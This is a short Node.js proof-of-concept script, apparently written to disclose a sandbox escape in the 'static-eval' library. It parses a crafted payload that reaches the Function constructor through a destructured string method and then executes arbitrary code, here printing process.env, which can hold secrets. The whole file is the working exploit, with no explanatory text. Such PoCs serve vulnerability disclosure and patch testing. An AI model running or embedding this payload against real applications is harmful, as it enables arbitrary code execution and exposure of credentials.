var evaluate = require('static-eval');
var parse = require('esprima').parse;

var src = process.argv[2];
var payload = '(function({x}){return x.constructor})({x:"".sub})("console.log(process.env)")()'
var ast = parse(payload).body[0].expression;
console.log(evaluate(ast, {x:1}));
